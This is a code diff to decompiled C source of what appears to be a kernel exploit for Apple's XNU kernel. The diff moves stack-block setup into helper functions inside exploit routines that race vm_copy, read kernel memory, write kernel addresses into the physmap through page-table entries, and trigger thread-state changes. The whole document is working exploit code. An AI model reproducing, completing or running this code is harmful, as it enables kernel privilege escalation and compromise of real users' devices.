@@ -154,6 +154,71 @@ typedef struct VmcopyTriggerThreadBlock
   semaphore_t resumeSemaphore;
 } VmcopyTriggerThreadBlock;
 
+static inline void vmcopy_init_race_thread_block(
+        VmcopyRaceThreadBlock *block,
+        __int64 *state,
+        thread_act_t *targetThread,
+        void *threadList,
+        semaphore_t readySemaphore,
+        semaphore_t resumeSemaphore)
+{
+  block->isa = _NSConcreteStackBlock;
+  block->flags = 3221225472LL;
+  block->invoke = run_exploit_thread;
+  block->descriptor = &unk_44870;
+  block->readySemaphore = readySemaphore;
+  block->resumeSemaphore = resumeSemaphore;
+  block->state = state;
+  block->targetThread = targetThread;
+  block->threadList = threadList;
+}
+
+static inline void vmcopy_init_write_physmap_block(
+        VmcopyWritePhysmapBlock *block,
+        __int64 ctx,
+        __int64 kaddr,
+        uint64_t pteIndex,
+        uint64_t pteAddr,
+        uint64_t pageTableBase,
+        vm_size_t size,
+        int pageShift,
+        mem_entry_name_port_t objectHandle,
+        uint64_t savedNext,
+        uint64_t savedPrev)
+{
+  block->isa = _NSConcreteStackBlock;
+  block->flags = 3221225472LL;
+  block->invoke = write_kaddr_to_physmap;
+  block->descriptor = &unk_44890;
+  block->ctx = ctx;
+  block->kaddr = kaddr;
+  block->pteIndex = pteIndex;
+  block->pteAddr = pteAddr;
+  block->pageTableBase = pageTableBase;
+  block->size = size;
+  block->pageShift = pageShift;
+  block->objectHandle = objectHandle;
+  block->savedNext = savedNext;
+  block->savedPrev = savedPrev;
+}
+
+static inline void vmcopy_init_trigger_thread_block(
+        VmcopyTriggerThreadBlock *block,
+        __int64 ctx,
+        __int64 *state,
+        semaphore_t readySemaphore,
+        semaphore_t resumeSemaphore)
+{
+  block->isa = _NSConcreteStackBlock;
+  block->flags = 3221225472LL;
+  block->invoke = trigger_thread_state_mod;
+  block->descriptor = &unk_448B0;
+  block->readySemaphore = readySemaphore;
+  block->resumeSemaphore = resumeSemaphore;
+  block->ctx = ctx;
+  block->state = state;
+}
+
 static inline void vmcopy_patch_memory_entry_page(__int64 kreadCtx, __int64 pageInfoKaddr, uint32_t ppnum, __int128 scratch[2])
 {
   memset(scratch, 0, 32);
@@ -7965,15 +8030,7 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
     v27 = v151;
     v150 = 0;
     memset(v180, 0, sizeof(v180));
-    raceThreadBlock.isa = _NSConcreteStackBlock;
-    raceThreadBlock.flags = 3221225472LL;
-    raceThreadBlock.invoke = run_exploit_thread;
-    raceThreadBlock.descriptor = &unk_44870;
-    raceThreadBlock.readySemaphore = v160;
-    raceThreadBlock.resumeSemaphore = semaphore;
-    raceThreadBlock.state = &v150;
-    raceThreadBlock.targetThread = &target_act;
-    raceThreadBlock.threadList = v180;
+    vmcopy_init_race_thread_block(&raceThreadBlock, &v150, &target_act, v180, v160, semaphore);
     pthread_create(&v149, 0, (void *(__cdecl *)(void *))call_vtable_ptr_slot2, &raceThreadBlock);
     semaphore_wait(semaphore);
     v28 = pthread_mach_thread_np(v149);
@@ -8147,20 +8204,18 @@ LABEL_68:
     memcpy(__dst, *(const void **)(someStruct + 24), sizeof(__dst));
     v68 = kread_u64_value(*(uint64_t *)(someStruct + 8), v95);
     v69 = kread_u64_value(*(uint64_t *)(someStruct + 8), v65 + 8);
-    writePhysmapBlock.isa = _NSConcreteStackBlock;
-    writePhysmapBlock.flags = 3221225472LL;
-    writePhysmapBlock.invoke = write_kaddr_to_physmap;
-    writePhysmapBlock.descriptor = &unk_44890;
-    writePhysmapBlock.ctx = someStruct;
-    writePhysmapBlock.kaddr = v95;
-    writePhysmapBlock.pteIndex = v99;
-    writePhysmapBlock.pteAddr = v65;
-    writePhysmapBlock.pageTableBase = v106;
-    writePhysmapBlock.size = size;
-    writePhysmapBlock.pageShift = v159;
-    writePhysmapBlock.objectHandle = object_handle;
-    writePhysmapBlock.savedNext = v69;
-    writePhysmapBlock.savedPrev = v68;
+    vmcopy_init_write_physmap_block(
+      &writePhysmapBlock,
+      someStruct,
+      v95,
+      v99,
+      v65,
+      v106,
+      size,
+      v159,
+      object_handle,
+      v69,
+      v68);
     v70 = get_task_kobject_addr_from_field32(*(uint64_t *)(someStruct + 8), v162);
     v71 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)(someStruct + 8), 32);
     v72 = kread_u64_value(*(uint64_t *)(someStruct + 8), qword_48008 + v70);
@@ -8215,14 +8270,7 @@ LABEL_68:
     {
       memcpy(*(void **)(someStruct + 24), __dst, 0x130u);
       v150 = 0;
-      triggerThreadBlock.isa = _NSConcreteStackBlock;
-      triggerThreadBlock.flags = 3221225472LL;
-      triggerThreadBlock.invoke = trigger_thread_state_mod;
-      triggerThreadBlock.descriptor = &unk_448B0;
-      triggerThreadBlock.readySemaphore = v160;
-      triggerThreadBlock.resumeSemaphore = semaphore;
-      triggerThreadBlock.ctx = someStruct;
-      triggerThreadBlock.state = &v150;
+      vmcopy_init_trigger_thread_block(&triggerThreadBlock, someStruct, &v150, v160, semaphore);
       pthread_create(&v149, 0, (void *(__cdecl *)(void *))call_vtable_ptr_slot2, &triggerThreadBlock);
       semaphore_wait(semaphore);
       semaphore_signal(v160);
